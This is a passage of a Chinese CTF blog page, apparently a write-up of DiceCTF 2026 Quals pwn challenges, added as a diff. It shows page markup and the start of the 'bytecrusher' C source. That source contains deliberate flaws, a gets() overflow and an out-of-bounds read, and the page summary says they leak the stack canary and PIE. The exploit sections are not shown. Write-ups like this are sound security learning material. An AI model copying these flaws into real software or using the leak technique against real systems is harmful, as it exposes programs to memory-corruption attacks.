@@ -1,0 +1,1305 @@
+<!DOCTYPE html>
+<html lang="zh-CN" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="bytecrusher checksec code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; void admin_portal() { puts(&#34;Welcome dicegang admin!&#34;); FILE *f = fopen(&#34;flag.txt&#34;, &#34;r&#34;); if (f) { char read; while ((read = fgetc(f)) != EOF) { putchar(read); } fclose(f); } else { puts(&#34;flag file not found&#34;); } } void crush_string(char *input, char *output, int rate, int output_max_len) { if (rate &lt; 1) rate = 1; int out_idx = 0; for (int i = 0; input[i] != &#39;\\0&#39; &amp;&amp; out_idx &lt; output_max_len - 1; i += rate) { output[out_idx++] = input[i]; } output[out_idx] = &#39;\\0&#39;; } void free_trial() { char input_buf[32]; char crushed[32]; for (int i=0; i&lt;16; i++) { printf(&#34;Enter a string to crush:\\n&#34;); fgets(input_buf, sizeof(input_buf), stdin); printf(&#34;Enter crush rate:\\n&#34;); int rate; scanf(&#34;%d&#34;, &amp;rate); if (rate &lt; 1) { printf(&#34;Invalid crush rate, using default of 1.\\n&#34;); rate = 1; } printf(&#34;Enter output length:\\n&#34;); int output_len; scanf(&#34;%d&#34;, &amp;output_len); if (output_len &gt; sizeof(crushed)) { printf(&#34;Output length too large, using max size.\\n&#34;); output_len = sizeof(crushed); } crush_string(input_buf, crushed, rate, output_len); printf(&#34;Crushed string:\\n&#34;); puts(crushed); } } void get_feedback() { char buf[16]; printf(&#34;Enter some text:\\n&#34;); gets(buf); printf(&#34;Your feedback has been recorded and totally not thrown away.\\n&#34;); } #define COMPILE_ADMIN_MODE 0 int main() { setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stdout, NULL, _IONBF, 0); printf(&#34;Welcome to ByteCrusher, dicegang&#39;s new proprietary text crusher!\\n&#34;); printf(&#34;We are happy to offer sixteen free trials of our premium service.\\n&#34;); free_trial(); get_feedback(); printf(&#34;\\nThank you for trying ByteCrusher! We hope you enjoyed it.\\n&#34;); if (COMPILE_ADMIN_MODE) { admin_portal(); } return 0; } 有越界写，通过选择合适的 rates 可以逐字节泄露 canary 和 pie ，毕竟至少有 16 字节的泄露机会\n">
+<title>DiceCTF-2026-Quals 个人题解</title>
+
+
+<link rel="canonical" href="http://localhost:1313/p/dicectf-2026-quals-%E4%B8%AA%E4%BA%BA%E9%A2%98%E8%A7%A3/">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap">
+
+
+<link rel="stylesheet" href="/scss/style.min.f07223732388fcfc9e9e33f79b2c08174819cdcd3f313187c649bb495e7dd3ae.css"><meta property='og:title' content="DiceCTF-2026-Quals 个人题解">
+<meta property='og:description' content="bytecrusher checksec code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; void admin_portal() { puts(&#34;Welcome dicegang admin!&#34;); FILE *f = fopen(&#34;flag.txt&#34;, &#34;r&#34;); if (f) { char read; while ((read = fgetc(f)) != EOF) { putchar(read); } fclose(f); } else { puts(&#34;flag file not found&#34;); } } void crush_string(char *input, char *output, int rate, int output_max_len) { if (rate &lt; 1) rate = 1; int out_idx = 0; for (int i = 0; input[i] != &#39;\\0&#39; &amp;&amp; out_idx &lt; output_max_len - 1; i += rate) { output[out_idx++] = input[i]; } output[out_idx] = &#39;\\0&#39;; } void free_trial() { char input_buf[32]; char crushed[32]; for (int i=0; i&lt;16; i++) { printf(&#34;Enter a string to crush:\\n&#34;); fgets(input_buf, sizeof(input_buf), stdin); printf(&#34;Enter crush rate:\\n&#34;); int rate; scanf(&#34;%d&#34;, &amp;rate); if (rate &lt; 1) { printf(&#34;Invalid crush rate, using default of 1.\\n&#34;); rate = 1; } printf(&#34;Enter output length:\\n&#34;); int output_len; scanf(&#34;%d&#34;, &amp;output_len); if (output_len &gt; sizeof(crushed)) { printf(&#34;Output length too large, using max size.\\n&#34;); output_len = sizeof(crushed); } crush_string(input_buf, crushed, rate, output_len); printf(&#34;Crushed string:\\n&#34;); puts(crushed); } } void get_feedback() { char buf[16]; printf(&#34;Enter some text:\\n&#34;); gets(buf); printf(&#34;Your feedback has been recorded and totally not thrown away.\\n&#34;); } #define COMPILE_ADMIN_MODE 0 int main() { setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stdout, NULL, _IONBF, 0); printf(&#34;Welcome to ByteCrusher, dicegang&#39;s new proprietary text crusher!\\n&#34;); printf(&#34;We are happy to offer sixteen free trials of our premium service.\\n&#34;); free_trial(); get_feedback(); printf(&#34;\\nThank you for trying ByteCrusher! We hope you enjoyed it.\\n&#34;); if (COMPILE_ADMIN_MODE) { admin_portal(); } return 0; } 有越界写，通过选择合适的 rates 可以逐字节泄露 canary 和 pie ，毕竟至少有 16 字节的泄露机会\n">
+<meta property='og:url' content='http://localhost:1313/p/dicectf-2026-quals-%E4%B8%AA%E4%BA%BA%E9%A2%98%E8%A7%A3/'>
+<meta property='og:site_name' content='RatherHard の Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='pwn' /><meta property='article:tag' content='DiceCTF2026Quals' /><meta property='article:tag' content='WriteUp' /><meta property='article:published_time' content='2026-03-10T13:29:00&#43;00:00'/><meta property='article:modified_time' content='2026-03-10T13:29:00&#43;00:00'/>
+<meta name="twitter:title" content="DiceCTF-2026-Quals 个人题解">
+<meta name="twitter:description" content="bytecrusher checksec code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; void admin_portal() { puts(&#34;Welcome dicegang admin!&#34;); FILE *f = fopen(&#34;flag.txt&#34;, &#34;r&#34;); if (f) { char read; while ((read = fgetc(f)) != EOF) { putchar(read); } fclose(f); } else { puts(&#34;flag file not found&#34;); } } void crush_string(char *input, char *output, int rate, int output_max_len) { if (rate &lt; 1) rate = 1; int out_idx = 0; for (int i = 0; input[i] != &#39;\\0&#39; &amp;&amp; out_idx &lt; output_max_len - 1; i += rate) { output[out_idx++] = input[i]; } output[out_idx] = &#39;\\0&#39;; } void free_trial() { char input_buf[32]; char crushed[32]; for (int i=0; i&lt;16; i++) { printf(&#34;Enter a string to crush:\\n&#34;); fgets(input_buf, sizeof(input_buf), stdin); printf(&#34;Enter crush rate:\\n&#34;); int rate; scanf(&#34;%d&#34;, &amp;rate); if (rate &lt; 1) { printf(&#34;Invalid crush rate, using default of 1.\\n&#34;); rate = 1; } printf(&#34;Enter output length:\\n&#34;); int output_len; scanf(&#34;%d&#34;, &amp;output_len); if (output_len &gt; sizeof(crushed)) { printf(&#34;Output length too large, using max size.\\n&#34;); output_len = sizeof(crushed); } crush_string(input_buf, crushed, rate, output_len); printf(&#34;Crushed string:\\n&#34;); puts(crushed); } } void get_feedback() { char buf[16]; printf(&#34;Enter some text:\\n&#34;); gets(buf); printf(&#34;Your feedback has been recorded and totally not thrown away.\\n&#34;); } #define COMPILE_ADMIN_MODE 0 int main() { setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stdout, NULL, _IONBF, 0); printf(&#34;Welcome to ByteCrusher, dicegang&#39;s new proprietary text crusher!\\n&#34;); printf(&#34;We are happy to offer sixteen free trials of our premium service.\\n&#34;); free_trial(); get_feedback(); printf(&#34;\\nThank you for trying ByteCrusher! We hope you enjoyed it.\\n&#34;); if (COMPILE_ADMIN_MODE) { admin_portal(); } return 0; } 有越界写，通过选择合适的 rates 可以逐字节泄露 canary 和 pie ，毕竟至少有 16 字节的泄露机会\n">
+        <link rel="shortcut icon" href="https://pic.ratherhard.com/avatar/avatar1.jpg" />
+        <script src="https://fastly.jsdelivr.net/npm/live2d-widgets@1.0.0/dist/autoload.js"></script>
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "dark");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            <figure class="site-avatar">
+                <a href="/">
+                    
+                        <img src="https://pic.ratherhard.com/avatar/avatar1.jpg" class="site-logo" loading="lazy" alt="Avatar"></a>
+                
+                    <span class="emoji">🐱</span>
+                
+            </figure>
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">RatherHard の Blog</a></h1>
+            <h2 class="site-description">路漫漫其修远兮</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/RatherHard'
+                        
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>博客首页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>文章归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索文章</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/' >
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友情链接</span>
+            </a>
+        </li>
+        
+        
+            <li id="dark-mode-toggle">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                <span>暗色模式</span>
+            </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav class="toc-nav" id="TableOfContents">
+                
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#bytecrusher">bytecrusher</a>
+          <ul>
+            <li><a href="#checksec">checksec</a></li>
+            <li><a href="#code">code</a></li>
+            <li><a href="#ida">IDA</a>
+              <ul>
+                <li><a href="#free_trial">free_trial</a></li>
+                <li><a href="#get_feedback">get_feedback</a></li>
+              </ul>
+            </li>
+            <li><a href="#exp">exp</a></li>
+          </ul>
+        </li>
+        <li><a href="#message-store">message-store</a>
+          <ul>
+            <li><a href="#checksec-1">checksec</a></li>
+            <li><a href="#ida-1">IDA</a>
+              <ul>
+                <li><a href="#main">main</a></li>
+                <li><a href="#set_message">set_message</a></li>
+                <li><a href="#set_message_color">set_message_color</a></li>
+                <li><a href="#print_message">print_message</a></li>
+                <li><a href="#from_utf8_lossy">from_utf8_lossy</a></li>
+                <li><a href="#buffer">BUFFER</a></li>
+              </ul>
+            </li>
+            <li><a href="#攻击思路">攻击思路</a></li>
+            <li><a href="#exp-1">exp</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+
+            </nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            
+            
+            
+            <a href="/categories/contest/" style="background-color: hsl(39, 60%, 84%); color: hsl(39, 60%, 15%);">
+                Contest
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/dicectf-2026-quals-%E4%B8%AA%E4%BA%BA%E9%A2%98%E8%A7%A3/">DiceCTF-2026-Quals 个人题解</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    
+    
+    
+    <footer class="article-meta">
+        
+            <div class="inline-meta">
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                    <time class="article-time--published" datetime='2026-03-10T13:29:00Z'>2026-03-10 13:29</time>
+                    <time class="article-time--lastUpdated" datetime='2026-03-10T13:29:00Z'>
+                        于2026-03-10 13:29更新
+                    </time>
+                
+
+                | <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon-pencil">
+  <path d="M17 3a2.85 2.83 0 1 1 4 4L7.5 20.5 2 22l1.5-5.5Z"/>
+  <path d="m15 5 4 4"/>
+</svg>
+
+                <time class="article-time--counts">
+                    1397 字
+                </time>
+            </div>
+        
+
+        
+    </footer>
+    
+</div>
+
+</header>
+
+    
+    <aside class="article-toc">
+        <details>
+            <summary>
+                <div class="article-toc-title">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-chevron-right"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 6l6 6l-6 6" /></svg>
+                    <span>目录</span>
+                </div>
+            </summary>
+            <nav class="toc-nav">
+                
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#bytecrusher">bytecrusher</a>
+          <ul>
+            <li><a href="#checksec">checksec</a></li>
+            <li><a href="#code">code</a></li>
+            <li><a href="#ida">IDA</a>
+              <ul>
+                <li><a href="#free_trial">free_trial</a></li>
+                <li><a href="#get_feedback">get_feedback</a></li>
+              </ul>
+            </li>
+            <li><a href="#exp">exp</a></li>
+          </ul>
+        </li>
+        <li><a href="#message-store">message-store</a>
+          <ul>
+            <li><a href="#checksec-1">checksec</a></li>
+            <li><a href="#ida-1">IDA</a>
+              <ul>
+                <li><a href="#main">main</a></li>
+                <li><a href="#set_message">set_message</a></li>
+                <li><a href="#set_message_color">set_message_color</a></li>
+                <li><a href="#print_message">print_message</a></li>
+                <li><a href="#from_utf8_lossy">from_utf8_lossy</a></li>
+                <li><a href="#buffer">BUFFER</a></li>
+              </ul>
+            </li>
+            <li><a href="#攻击思路">攻击思路</a></li>
+            <li><a href="#exp-1">exp</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+
+            </nav>
+        </details>
+    </aside>
+    
+
+    <section class="article-content">
+    
+    
+    <h2 id="bytecrusher">bytecrusher
+</h2><h3 id="checksec">checksec
+</h3><p><img alt="这是什么鸭" class="gallery-image" data-flex-basis="711px" data-flex-grow="296" height="165" loading="lazy" sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src="https://pic.ratherhard.com/post/contest/DiceCTF-2026-Quals/bytecrusher/checksec.png" width="489"></p>
+<h3 id="code">code
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span><span class="lnt">89
+</span><span class="lnt">90
+</span><span class="lnt">91
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">admin_portal</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Welcome dicegang admin!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">FILE</span> <span class="o">*</span><span class="n">f</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="s">&#34;flag.txt&#34;</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">char</span> <span class="n">read</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="p">((</span><span class="n">read</span> <span class="o">=</span> <span class="nf">fgetc</span><span class="p">(</span><span class="n">f</span><span class="p">))</span> <span class="o">!=</span> <span class="n">EOF</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">putchar</span><span class="p">(</span><span class="n">read</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">fclose</span><span class="p">(</span><span class="n">f</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;flag file not found&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">crush_string</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">input</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">output</span><span class="p">,</span> <span class="kt">int</span> <span class="n">rate</span><span class="p">,</span> <span class="kt">int</span> <span class="n">output_max_len</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">rate</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">)</span> <span class="n">rate</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">out_idx</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">input</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="sc">&#39;\0&#39;</span> <span class="o">&amp;&amp;</span> <span class="n">out_idx</span> <span class="o">&lt;</span> <span class="n">output_max_len</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span> <span class="n">i</span> <span class="o">+=</span> <span class="n">rate</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">output</span><span class="p">[</span><span class="n">out_idx</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">input</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">output</span><span class="p">[</span><span class="n">out_idx</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">free_trial</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">input_buf</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">crushed</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">16</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Enter a string to crush:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">fgets</span><span class="p">(</span><span class="n">input_buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">input_buf</span><span class="p">),</span> <span class="n">stdin</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Enter crush rate:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">rate</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">rate</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
